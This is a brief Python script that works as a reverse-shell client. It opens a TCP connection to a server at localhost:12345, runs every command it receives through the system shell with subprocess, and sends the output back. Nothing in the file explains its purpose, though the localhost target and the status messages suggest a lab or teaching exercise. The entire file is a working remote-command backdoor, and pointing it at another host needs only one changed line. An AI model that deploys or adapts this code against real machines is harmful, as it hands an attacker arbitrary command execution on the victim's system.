import socket
import subprocess
import platform

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect(('localhost', 12345))
except Exception as e:
    print(f"Connection error: {e}")
    exit(1)

print("Connected to server. Awaiting commands...")

while True:
    try:
        command = client.recv(2048).decode().strip()
        if not command:
            break
        if command.lower() == 'exit':
            print("Server requested exit.")
            break

        # Execute the command
        # Inside the while loop after command is received:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            if not result:
                result = b"[Command executed with no output]"
            client.sendall(result)
        except subprocess.CalledProcessError as e:
            client.sendall(e.output or f"[Error] {e}".encode())
    except Exception as e:
        print(f"Error: {e}")
        break

client.close()
print("Connection closed.")
